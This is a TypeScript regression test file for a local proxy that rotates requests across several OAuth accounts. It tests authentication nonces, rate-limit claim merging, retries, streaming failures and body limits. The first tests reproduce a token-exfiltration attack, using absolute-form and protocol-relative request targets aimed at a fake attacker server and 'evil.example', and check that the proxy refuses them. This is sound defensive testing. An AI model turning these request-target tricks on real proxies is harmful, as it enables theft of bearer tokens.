// Regression tests for defects found in adversarial review.
//
// The headline one is real and was reproduced before the fix: a local process
// could make the proxy attach a live OAuth bearer token to a request aimed at
// an arbitrary host.

import assert from 'node:assert/strict';
import http from 'node:http';
import net from 'node:net';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { after, test } from 'node:test';

import { MAX_CONFIGURABLE_REQUEST_BODY_BYTES, REPORT_ONLY_MEMORY_CEILING_BYTES, isOriginFormTarget, isRetryableTransportError, retryAfterMs, startProxy } from '../src/proxy.js';
import { mergeClaims } from '../src/accounts.js';
import { parseClaims } from '../src/claims.js';
import { computeHeadroom, selectAccount } from '../src/policy.js';
import type { AccountState } from '../src/policy.js';
import { MAX_PENDING_FRAME_BYTES, UsageCollector } from '../src/usage.js';
import { ClientCredentialStore, clientCredentialDir, createClientCredential, readRuntimeCredential, removeClientCredential } from '../src/admission.js';
import { AttemptStore } from '../src/attempts.js';
import { MetricsStore } from '../src/metrics.js';

const cleanups: (() => void)[] = [];
after(() => {
  for (const c of cleanups.reverse()) {
    try {
      c();
    } catch {
      /* ignore */
    }
  }
});

function tmp(prefix: string): string {
  const dir = mkdtempSync(path.join(os.tmpdir(), prefix));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

function fakeAuthswap(token: string): string {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    path.join(dir, '.credentials-1-a@x.com.json'),
    JSON.stringify({ claudeAiOauth: { accessToken: token, expiresAt: Date.now() + 3_600_000 } }),
  );
  return root;
}

async function listen(server: http.Server): Promise<number> {
  await new Promise<void>(r => server.listen(0, '127.0.0.1', () => r()));
  cleanups.push(() => server.close());
  return (server.address() as { port: number }).port;
}

/** Send a raw request line so we control the request TARGET form exactly. */
function rawRequest(port: number, requestLine: string): Promise<string> {
  return new Promise(resolve => {
    let received = '';
    const socket = net.connect(port, '127.0.0.1', () => {
      socket.write(
        `${requestLine} HTTP/1.1\r\nHost: 127.0.0.1:${port}\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}`,
      );
    });
    socket.on('data', d => (received += d.toString('utf8')));
    socket.on('close', () => resolve(received));
    socket.on('error', () => resolve(received));
    setTimeout(() => {
      socket.destroy();
      resolve(received);
    }, 4000);
  });
}

test('an absolute-form request target cannot exfiltrate an account token', async () => {
  const TOKEN = 'SECRET-OAUTH-TOKEN-MARKER';
  const authswapRoot = fakeAuthswap(TOKEN);

  let stolen: string | undefined;
  const attackerPort = await listen(
    http.createServer((req, res) => {
      stolen = req.headers.authorization;
      res.writeHead(200).end('pwned');
    }),
  );
  const upstreamPort = await listen(
    http.createServer((_req, res) => {
      res.writeHead(200).end('{}');
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  const response = await rawRequest(port, `POST http://127.0.0.1:${attackerPort}/steal`);

  assert.equal(stolen, undefined, 'no credential reached the attacker origin');
  assert.match(response, /^HTTP\/1\.1 400/, 'the request target was refused outright');
});

test('a protocol-relative target is refused for the same reason', async () => {
  const authswapRoot = fakeAuthswap('tok');
  let stolen: string | undefined;
  const attackerPort = await listen(
    http.createServer((req, res) => {
      stolen = req.headers.authorization;
      res.writeHead(200).end('x');
    }),
  );
  const upstreamPort = await listen(
    http.createServer((_r, res) => {
      res.writeHead(200).end('{}');
    }),
  );
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  const response = await rawRequest(port, `POST //127.0.0.1:${attackerPort}/steal`);
  assert.equal(stolen, undefined);
  assert.match(response, /^HTTP\/1\.1 400/);
});

test('normal origin-form targets are still accepted', () => {
  assert.equal(isOriginFormTarget('/v1/messages'), true);
  assert.equal(isOriginFormTarget('/v1/messages?beta=true'), true);
  assert.equal(isOriginFormTarget('http://evil.example/x'), false);
  assert.equal(isOriginFormTarget('https://evil.example/x'), false);
  assert.equal(isOriginFormTarget('//evil.example/x'), false);
  assert.equal(isOriginFormTarget('/\\evil.example'), false);
  assert.equal(isOriginFormTarget('*'), false);
  assert.equal(isOriginFormTarget(undefined), false);
});

test('an invalid local nonce rejects before body buffering and credential selection', async () => {
  const authswapRoot = fakeAuthswap('SECRET-TOKEN-MUST-NOT-LOAD');
  let upstreamHit = false;
  const upstreamPort = await listen(
    http.createServer((_req, res) => {
      upstreamHit = true;
      res.writeHead(200).end('{}');
    }),
  );
  const stateRoot = tmp('cab-sec-st-');
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());

  const body = 'x'.repeat(256 * 1024);
  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-api-key': 'wrong' },
    body,
  });
  assert.equal(res.status, 401);
  assert.equal(upstreamHit, false);

  const store = new AttemptStore(stateRoot);
  try {
    const rows = store.query('SELECT outcome, reason_code, wire_started FROM auth_balancer_attempts') as Record<string, number | string>[];
    assert.equal(rows.length, 1);
    assert.equal(rows[0]!['outcome'], 'security_rejected');
    assert.equal(rows[0]!['reason_code'], 'invalid_local_nonce');
    assert.equal(rows[0]!['wire_started'], 0);
  } finally {
    store.close();
  }
});

test('the daemon runtime credential authenticates and survives clean shutdown', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      req.on('end', () => res.writeHead(200, {}).end('{}'));
    }),
  );
  const stateRoot = tmp('cab-runtime-');
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: false,
    usageProbe: false,
  });
  const credential = readRuntimeCredential(stateRoot);
  assert.ok(credential);

  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-api-key': credential.nonce },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });
  assert.equal(res.status, 200);

  await new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve()));
  assert.equal(readRuntimeCredential(stateRoot)?.nonce, credential.nonce,
    'the nonce is persistent: removing it here regenerates it on the next start');
});

// --- per-client credentials -----------------------------------------------
//
// The property under test is hot-reload: a client launched against daemon A
// must keep authenticating against daemon B on the same state root, because
// its nonce lives in the on-disk registry, not in daemon memory.

async function bootAuthProxy(stateRoot: string, authswapRoot: string) {
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      req.on('end', () => res.writeHead(200, {}).end('{}'));
    }),
  );
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: false,
    usageProbe: false,
  });
  cleanups.push(() => server.close());
  return { server, port };
}

function postMessages(port: number, nonce: string): Promise<Response> {
  return fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-api-key': nonce },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });
}

test('a per-client credential authenticates across a daemon restart', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const stateRoot = tmp('cab-client-restart-');

  const a = await bootAuthProxy(stateRoot, authswapRoot);
  const { credential, filePath } = createClientCredential(stateRoot);
  cleanups.push(() => removeClientCredential(filePath));
  assert.equal((await postMessages(a.port, credential.nonce)).status, 200);

  // "Restart": daemon A shuts down cleanly and daemon B boots on the same
  // state root. Both the registry entry and the gateway nonce carry over.
  await new Promise<void>((resolve, reject) => a.server.close(e => e ? reject(e) : resolve()));
  const b = await bootAuthProxy(stateRoot, authswapRoot);

  assert.equal((await postMessages(b.port, credential.nonce)).status, 200,
    'the registry nonce must survive the restart');
  const instanceB = readRuntimeCredential(stateRoot);
  assert.ok(instanceB);
  assert.equal((await postMessages(b.port, instanceB.nonce)).status, 200,
    'the gateway nonce works too');
});

test('a dead-pid client credential is rejected and swept', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const stateRoot = tmp('cab-client-dead-');
  const proxy = await bootAuthProxy(stateRoot, authswapRoot);

  const { credential, filePath } = createClientCredential(stateRoot);
  const dead = { ...credential, client_pid: 999_999_999 };
  writeFileSync(filePath, JSON.stringify(dead), { mode: 0o600 });

  assert.equal((await postMessages(proxy.port, credential.nonce)).status, 401,
    'an entry whose launcher is gone must not authenticate');
  assert.equal(new ClientCredentialStore(stateRoot).sweep(), 1);
});

test('an expired adopted credential is rejected; a live one authenticates', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const stateRoot = tmp('cab-client-adopted-');
  const proxy = await bootAuthProxy(stateRoot, authswapRoot);
  const dir = clientCredentialDir(stateRoot);
  mkdirSync(dir, { recursive: true, mode: 0o700 });

  const write = (name: string, entry: object) =>
    writeFileSync(path.join(dir, name), JSON.stringify(entry), { mode: 0o600 });

  write('adopted-live.json', {
    schema_version: 1, nonce: 'adopted-live-nonce', expires_at_ms: Date.now() + 60_000, created_at: new Date().toISOString(),
  });
  write('adopted-expired.json', {
    schema_version: 1, nonce: 'adopted-expired-nonce', expires_at_ms: Date.now() - 1, created_at: new Date().toISOString(),
  });
  // No pid and no expiry would be a permanent secret; it must not load.
  write('adopted-unbounded.json', {
    schema_version: 1, nonce: 'adopted-unbounded-nonce', created_at: new Date().toISOString(),
  });

  assert.equal((await postMessages(proxy.port, 'adopted-live-nonce')).status, 200);
  assert.equal((await postMessages(proxy.port, 'adopted-expired-nonce')).status, 401);
  assert.equal((await postMessages(proxy.port, 'adopted-unbounded-nonce')).status, 401);
});

test('a group- or world-readable client credential does not authenticate', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const stateRoot = tmp('cab-client-mode-');
  const proxy = await bootAuthProxy(stateRoot, authswapRoot);

  const { credential, filePath } = createClientCredential(stateRoot);
  const { chmodSync } = await import('node:fs');
  chmodSync(filePath, 0o644);

  assert.equal((await postMessages(proxy.port, credential.nonce)).status, 401,
    'an entry another local user could have read is not a secret');
});

test('a freshly written client credential is honored despite the scan cache', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const stateRoot = tmp('cab-client-fresh-');
  const proxy = await bootAuthProxy(stateRoot, authswapRoot);

  // Prime the store's cache with an empty registry via a failed auth.
  assert.equal((await postMessages(proxy.port, 'nonsense')).status, 401);
  const { credential, filePath } = createClientCredential(stateRoot);
  cleanups.push(() => removeClientCredential(filePath));
  assert.equal((await postMessages(proxy.port, credential.nonce)).status, 200,
    'a miss must rescan the registry before rejecting');
});

test('a listen failure keeps the nonce; the dead pid is what blocks a launch', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const occupied = http.createServer();
  const occupiedPort = await listen(occupied);
  const stateRoot = tmp('cab-runtime-listen-fail-');

  await assert.rejects(
    startProxy({
      port: occupiedPort,
      upstream: 'http://127.0.0.1:1',
      stateRoot,
      authswapRoot,
      metrics: false,
      usageProbe: false,
    }),
  );
  // Unlinking here would mint a new nonce on the next successful start, which
  // is the breakage this change exists to remove. A real daemon exits after a
  // failed listen, so its pid dies and the launcher refuses — but that pid is
  // this test process, so it is alive here; the dead-pid refusal is proven in
  // client-launch.test.ts instead.
  assert.ok(readRuntimeCredential(stateRoot));
});

// --- claim observation merging -------------------------------------------

test('an Opus response does not erase the Fable weekly budget', () => {
  const fable = parseClaims({
    'anthropic-ratelimit-unified-5h-utilization': '0.20',
    'anthropic-ratelimit-unified-7d-utilization': '0.30',
    'anthropic-ratelimit-unified-7d_oi-utilization': '0.96',
  });
  // A later Opus request carries no 7d_oi header at all.
  const opus = parseClaims({
    'anthropic-ratelimit-unified-5h-utilization': '0.25',
    'anthropic-ratelimit-unified-7d-utilization': '0.35',
  });

  const merged = mergeClaims(fable, opus);
  assert.equal(merged.byId['5h']?.utilization, 0.25, 'fresh values win');
  assert.equal(merged.byId['7d']?.utilization, 0.35);
  assert.equal(merged.byId['7d_oi']?.utilization, 0.96, 'the Fable budget survives');

  // and the evacuation rule still fires for Fable on the merged state
  const account: AccountState = { slot: '1', health: 'ok', claims: merged };
  const h = computeHeadroom(account, 'claude-fable-5', Date.now());
  assert.equal(h.evacuating, true, '96% Fable utilization must still evacuate');
});

// --- stale rejected claims ------------------------------------------------

test('a rejected claim whose window has reset does not strand the account', () => {
  const now = 2_000_000_000_000;
  const stale = parseClaims({
    'anthropic-ratelimit-unified-7d-status': 'rejected',
    'anthropic-ratelimit-unified-7d-utilization': '1.0',
    // reset one minute in the past
    'anthropic-ratelimit-unified-7d-reset': String(Math.floor((now - 60_000) / 1000)),
  });
  const account: AccountState = { slot: '1', health: 'ok', claims: stale };

  const h = computeHeadroom(account, 'claude-opus-5', now);
  assert.equal(h.headroom, 1, 'the window rolled over; the rejection is stale');
  assert.equal(h.evacuating, false);

  const s = selectAccount({ accounts: [account], model: 'claude-opus-5', nowMs: now });
  assert.equal(s.slot, '1', 'the account is selectable again');
});

test('a rejected claim that has NOT reset still blocks the account', () => {
  const now = 2_000_000_000_000;
  const live = parseClaims({
    'anthropic-ratelimit-unified-7d-status': 'rejected',
    'anthropic-ratelimit-unified-7d-utilization': '1.0',
    'anthropic-ratelimit-unified-7d-reset': String(Math.floor((now + 3_600_000) / 1000)),
  });
  const h = computeHeadroom({ slot: '1', health: 'ok', claims: live }, 'claude-opus-5', now);
  assert.equal(h.headroom, 0);
});

// --- retry breadth --------------------------------------------------------

test('every account is tried before reporting exhaustion', async () => {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  for (const slot of ['1', '2', '3', '4', '5']) {
    writeFileSync(
      path.join(dir, `.credentials-${slot}-s${slot}@x.com.json`),
      JSON.stringify({
        claudeAiOauth: { accessToken: `tok-${slot}`, expiresAt: Date.now() + 3_600_000 },
      }),
    );
  }

  const seen: string[] = [];
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      const auth = req.headers.authorization ?? '';
      seen.push(auth);
      req.resume();
      req.on('end', () => {
        // Only the LAST slot succeeds.
        if (auth === 'Bearer tok-5') {
          res.writeHead(200, {}).end('{"ok":true}');
        } else {
          res.writeHead(429, {}).end('{}');
        }
      });
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot: root,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ model: 'claude-opus-5' }),
  });
  assert.equal(res.status, 200, 'the fifth account was reached');
  assert.equal(await res.text(), '{"ok":true}');
  assert.equal(new Set(seen).size, 5, 'all five distinct accounts were tried');
});

// --- session pinning race -------------------------------------------------

test('concurrent opening requests for one session land on the same account', async () => {
  const root = tmp('cab-sec-as-');
  const dir = path.join(root, 'providers', 'anthropic', 'credentials');
  mkdirSync(dir, { recursive: true });
  for (const slot of ['1', '2']) {
    writeFileSync(
      path.join(dir, `.credentials-${slot}-s${slot}@x.com.json`),
      JSON.stringify({
        claudeAiOauth: { accessToken: `tok-${slot}`, expiresAt: Date.now() + 3_600_000 },
      }),
    );
  }

  const seen: string[] = [];
  // Hold every response open briefly so the requests genuinely overlap.
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      seen.push(req.headers.authorization ?? '');
      req.resume();
      setTimeout(() => res.writeHead(200, {}).end('{}'), 120);
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot: root,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  const send = (p: string) =>
    fetch(`http://127.0.0.1:${port}${p}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-claude-code-session-id': 'race-session' },
      body: JSON.stringify({ model: 'claude-opus-5' }),
    });

  await Promise.all([send('/v1/messages'), send('/v1/messages/count_tokens'), send('/v1/messages')]);

  assert.equal(seen.length, 3);
  assert.equal(new Set(seen).size, 1, `session split across accounts: ${[...new Set(seen)].join(', ')}`);
});

// --- stream failure -------------------------------------------------------

test('an upstream that dies mid-body records terminal_failure without completed usage', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      res.writeHead(200, { 'content-type': 'text/event-stream' });
      res.write('event: message_start\ndata: {"type":"message_start"}\n\n');
      // Kill the socket without ending the response.
      setTimeout(() => res.socket?.destroy(), 50);
    }),
  );
  const stateRoot = tmp('cab-sec-stream-dies-');

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: true,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  const finished = await Promise.race([
    fetch(`http://127.0.0.1:${port}/v1/messages`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ model: 'claude-opus-5', stream: true }),
    })
      .then(r => r.text())
      .then(() => 'settled')
      .catch(() => 'settled'),
    new Promise(r => setTimeout(() => r('HUNG'), 5000)),
  ]);
  assert.equal(finished, 'settled', 'the client request terminated rather than hanging');

  await new Promise(resolve => setTimeout(resolve, 100));
  const attempts = new AttemptStore(stateRoot);
  const metrics = new MetricsStore(stateRoot);
  try {
    const rows = attempts.query('SELECT outcome FROM auth_balancer_attempts ORDER BY id') as Record<string, string>[];
    assert.ok(rows.some(row => row.outcome === 'content_started'));
    assert.ok(rows.some(row => row.outcome === 'terminal_failure'));
    assert.equal(rows.some(row => row.outcome === 'completed'), false);
    assert.equal(metrics.query('SELECT id FROM requests').length, 0, 'stream failure must not finalize usage');
  } finally {
    attempts.close();
    metrics.close();
  }
});

test('a downstream client abort records aborted without completed usage', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  let upstreamClosed!: () => void;
  const upstreamClosedPromise = new Promise<void>(resolve => {
    upstreamClosed = resolve;
  });
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      res.writeHead(200, { 'content-type': 'text/event-stream' });
      res.write('event: message_start\ndata: {"type":"message_start"}\n\n');
      const timer = setInterval(() => res.write(': keepalive\n\n'), 50);
      res.on('close', () => {
        clearInterval(timer);
        upstreamClosed();
      });
    }),
  );
  const stateRoot = tmp('cab-client-abort-');
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: true,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  await new Promise<void>((resolve, reject) => {
    const body = JSON.stringify({ model: 'claude-opus-5', stream: true });
    const req = http.request({
      hostname: '127.0.0.1',
      port,
      path: '/v1/messages',
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'content-length': Buffer.byteLength(body),
      },
    }, res => {
      res.once('data', () => {
        res.destroy();
        resolve();
      });
    });
    req.on('error', error => {
      if ((error as NodeJS.ErrnoException).code !== 'ECONNRESET') reject(error);
    });
    req.end(body);
  });
  await Promise.race([
    upstreamClosedPromise,
    new Promise<void>((_resolve, reject) => setTimeout(() => reject(new Error('upstream was not cancelled')), 2000)),
  ]);
  await new Promise(resolve => setTimeout(resolve, 100));

  const attempts = new AttemptStore(stateRoot);
  const metrics = new MetricsStore(stateRoot);
  try {
    const rows = attempts.query('SELECT outcome, reason_code FROM auth_balancer_attempts ORDER BY id') as Record<string, string>[];
    assert.ok(rows.some(row => row.outcome === 'content_started'));
    assert.ok(rows.some(row => row.outcome === 'aborted' && row.reason_code === 'client_aborted'));
    assert.equal(rows.some(row => row.outcome === 'completed'), false);
    assert.equal(rows.some(row => row.outcome === 'terminal_failure'), false);
    assert.equal(metrics.query('SELECT id FROM requests').length, 0, 'client abort must not finalize usage');
  } finally {
    attempts.close();
    metrics.close();
  }
});

test('the response body is forwarded with its bytes unchanged', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const plain = 'event: message_start\ndata: {"type":"message_start"}\n\n';
  const gz = zlib.gzipSync(Buffer.from(plain, 'utf8'));

  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      req.on('end', () => {
        res.writeHead(200, {
          'content-type': 'text/event-stream',
          'content-encoding': 'gzip',
          'content-length': String(gz.length),
        });
        res.end(gz);
      });
    }),
  );

  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot: tmp('cab-sec-st-'),
    authswapRoot,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  // Raw socket: fetch would transparently gunzip and hide a re-encode.
  const raw = await new Promise<Buffer>(resolve => {
    const chunks: Buffer[] = [];
    const socket = net.connect(port, '127.0.0.1', () => {
      const body = JSON.stringify({ model: 'claude-opus-5' });
      socket.write(
        `POST /v1/messages HTTP/1.1\r\nHost: x\r\ncontent-type: application/json\r\n` +
          `Content-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n${body}`,
      );
    });
    socket.on('data', d => chunks.push(d as Buffer));
    socket.on('close', () => resolve(Buffer.concat(chunks)));
    setTimeout(() => {
      socket.destroy();
      resolve(Buffer.concat(chunks));
    }, 4000);
  });

  const sep = raw.indexOf('\r\n\r\n');
  const bodyBytes = raw.subarray(sep + 4);
  assert.ok(bodyBytes.equals(gz), 'compressed bytes must be relayed verbatim, not re-encoded');
});

test('a malformed compressed 200 still records one completed terminal attempt without usage', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  const invalidGzip = Buffer.from('not a gzip stream', 'utf8');
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.resume();
      req.on('end', () => {
        res.writeHead(200, {
          'content-type': 'text/event-stream',
          'content-encoding': 'gzip',
          'content-length': String(invalidGzip.length),
        });
        res.end(invalidGzip);
      });
    }),
  );
  const stateRoot = tmp('cab-invalid-gzip-');
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: true,
    usageProbe: false,
    requireGatewayAuth: false,
  });
  cleanups.push(() => server.close());

  const raw = await new Promise<Buffer>(resolve => {
    const chunks: Buffer[] = [];
    const socket = net.connect(port, '127.0.0.1', () => {
      const body = JSON.stringify({ model: 'claude-opus-5' });
      socket.write(
        `POST /v1/messages HTTP/1.1\r\nHost: x\r\ncontent-type: application/json\r\n` +
          `Content-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n${body}`,
      );
    });
    socket.on('data', d => chunks.push(d as Buffer));
    socket.on('close', () => resolve(Buffer.concat(chunks)));
    setTimeout(() => {
      socket.destroy();
      resolve(Buffer.concat(chunks));
    }, 4000);
  });
  assert.match(raw.toString('latin1'), /^HTTP\/1\.1 200/);
  const sep = raw.indexOf('\r\n\r\n');
  assert.ok(raw.subarray(sep + 4).equals(invalidGzip), 'malformed compressed bytes are still relayed unchanged');
  await new Promise(resolve => setTimeout(resolve, 100));

  const attempts = new AttemptStore(stateRoot);
  const metrics = new MetricsStore(stateRoot);
  try {
    const rows = attempts.query(
      "SELECT outcome, reason_code FROM auth_balancer_attempts WHERE phase = 'terminal' ORDER BY id",
    ) as Record<string, string>[];
    assert.equal(rows.length, 1);
    assert.equal(rows[0]!['outcome'], 'completed');
    assert.equal(rows[0]!['reason_code'], 'upstream_completed_observation_failed');
    assert.equal(metrics.query('SELECT id FROM requests').length, 0, 'malformed observation must not invent a usage row');
  } finally {
    attempts.close();
    metrics.close();
  }
});

// --- observer memory ------------------------------------------------------

test('a body with no frame delimiter does not grow the collector without bound', () => {
  const c = new UsageCollector();
  const chunk = 'x'.repeat(64 * 1024);
  for (let i = 0; i < 200; i += 1) c.push(chunk); // 12.8 MB with no "\n\n"
  assert.equal(c.overflowed, true);
  assert.ok(
    c['buffer'].length <= MAX_PENDING_FRAME_BYTES,
    `collector retained ${c['buffer'].length} bytes`,
  );
});

test('an enforced request body limit returns local 413 without upstream bytes', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  let upstreamHit = false;
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      upstreamHit = true;
      req.resume();
      req.on('end', () => res.writeHead(200, {}).end('{}'));
    }),
  );
  const stateRoot = tmp('cab-body-limit-');
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
    bodyLimitMode: 'enforce',
    maxRequestBodyBytes: 32,
  });
  cleanups.push(() => server.close());

  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ model: 'claude-opus-5', prompt: 'x'.repeat(128) }),
  });
  assert.equal(res.status, 413);
  assert.equal(upstreamHit, false);

  const store = new AttemptStore(stateRoot);
  try {
    const rows = store.query('SELECT outcome, wire_started FROM auth_balancer_attempts') as Record<string, number | string>[];
    assert.equal(rows[0]!['outcome'], 'body_limit_rejected');
    assert.equal(rows[0]!['wire_started'], 0);
  } finally {
    store.close();
  }
});

test('invalid proxy request body caps fail closed for enforce and report-only modes', async () => {
  const invalidValues = [
    Number.NaN,
    Number.POSITIVE_INFINITY,
    -1,
    0,
    1.5,
    MAX_CONFIGURABLE_REQUEST_BODY_BYTES + 1,
  ];
  for (const bodyLimitMode of ['enforce', 'report-only'] as const) {
    for (const maxRequestBodyBytes of invalidValues) {
      await assert.rejects(
        startProxy({
          port: 0,
          upstream: 'http://127.0.0.1:1',
          stateRoot: tmp('cab-invalid-body-cap-'),
          authswapRoot: fakeAuthswap('tok-1'),
          metrics: false,
          usageProbe: false,
          requireGatewayAuth: false,
          bodyLimitMode,
          maxRequestBodyBytes,
        }),
        /maxRequestBodyBytes must be/,
        `${bodyLimitMode} accepted ${String(maxRequestBodyBytes)}`,
      );
    }
  }
});

test('report-only body observation still forwards below the hard memory ceiling', async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  let upstreamBytes = 0;
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      req.on('data', (chunk: Buffer) => {
        upstreamBytes += chunk.length;
      });
      req.on('end', () => res.writeHead(200, {}).end('{}'));
    }),
  );
  const stateRoot = tmp('cab-body-report-');
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
    bodyLimitMode: 'report-only',
    maxRequestBodyBytes: 32,
  });
  cleanups.push(() => server.close());

  const body = JSON.stringify({ model: 'claude-opus-5', prompt: 'x'.repeat(128) });
  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body,
  });
  assert.equal(res.status, 200);
  assert.equal(upstreamBytes, Buffer.byteLength(body));

  const store = new AttemptStore(stateRoot);
  try {
    const rows = store.query("SELECT outcome, reason_code, wire_started FROM auth_balancer_attempts WHERE reason_code = 'request_body_limit_report_only'") as Record<string, number | string>[];
    assert.equal(rows.length, 1);
    assert.equal(rows[0]!['wire_started'], 0);
  } finally {
    store.close();
  }
});

test('report-only request bodies hit a non-configurable memory ceiling before upstream bytes', { timeout: 15000 }, async () => {
  const authswapRoot = fakeAuthswap('tok-1');
  let upstreamHit = false;
  const upstreamPort = await listen(
    http.createServer((req, res) => {
      upstreamHit = true;
      req.resume();
      req.on('end', () => res.writeHead(200, {}).end('{}'));
    }),
  );
  const stateRoot = tmp('cab-body-memory-ceiling-');
  const { server, port } = await startProxy({
    port: 0,
    upstream: `http://127.0.0.1:${upstreamPort}`,
    stateRoot,
    authswapRoot,
    metrics: false,
    usageProbe: false,
    requireGatewayAuth: false,
    bodyLimitMode: 'report-only',
    maxRequestBodyBytes: REPORT_ONLY_MEMORY_CEILING_BYTES,
  });
  cleanups.push(() => server.close());

  const res = await fetch(`http://127.0.0.1:${port}/v1/messages`, {
    method: 'POST',
    headers: { 'content-type': 'application/octet-stream' },
    body: Buffer.alloc(REPORT_ONLY_MEMORY_CEILING_BYTES + 1),
  });
  assert.equal(res.status, 413);
  assert.equal(upstreamHit, false);

  const store = new AttemptStore(stateRoot);
  try {
    const rows = store.query('SELECT outcome, reason_code, wire_started, evidence_codes_json FROM auth_balancer_attempts') as Record<string, number | string>[];
    assert.equal(rows.length, 1);
    assert.equal(rows[0]!['outcome'], 'body_limit_rejected');
    assert.equal(rows[0]!['reason_code'], 'request_body_memory_ceiling');
    assert.equal(rows[0]!['wire_started'], 0);
    assert.match(String(rows[0]!['evidence_codes_json']), /body_size_observed/);
  } finally {
    store.close();
  }
});

test('usage still parses correctly after an overflow-triggering preamble', () => {
  const c = new UsageCollector();
  c.push('x'.repeat(MAX_PENDING_FRAME_BYTES + 1024));
  c.push('\n\nevent: message_delta\ndata: {"usage":{"output_tokens":42}}\n\n');
  assert.equal(c.end().outputTokens, 42);
});

// --- model-scoped affinity ------------------------------------------------

